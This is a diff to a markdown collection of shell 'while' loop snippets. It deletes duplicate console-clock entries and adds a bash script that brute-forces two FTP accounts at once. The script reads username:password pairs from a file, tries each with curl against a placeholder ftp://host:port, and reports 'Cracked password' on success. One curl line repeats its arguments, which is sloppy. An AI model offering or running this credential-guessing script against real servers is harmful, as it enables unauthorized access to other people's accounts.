@@ -1,24 +1,38 @@
 # while
 
-### Put a console clock in top right corner
+### Bruteforce two ftp accounts at once
+
 ```sh
-while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
+#!/bin/bash
+# Author: wuseman
+# Desc: Bruteforce 2 accounts at once
+
+okMSG() {
+    echo -e "[\e[1;32m*\e[0m] $*"
+}
+
+errMSG() {
+    echo -e "[\e[1;31m*\e[0m] $*"
+}
+
+
+1() {
+    curl ftp://host:port -u $line &> /dev/null
+    [[ $? = "0" ]] &&  okMSG "Cracked password for $line" || errMSG "Bad password for $line"
+}
+
+2() {
+    curl ftp://host:port -u $line1 &> /dev/null -u $line1 &> /dev/null
+    [[ $? = "0" ]] &&  okMSG "Cracked password for $line1" || errMSG "Bad password for $line1"
+}
+
+while 
+	read line;read line1; 
+   	do 
+    1;2;sleep 0.1;
+done < test
 ```
 
-### Put a console clock in top right corner
-```sh
-while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
-```
-
-### Put a console clock in top right corner
-```sh
-while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
-```
-
-### Put a console clock in top right corner
-```sh
-while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
-```
 
 ### Put a console clock in top right corner
 ```sh
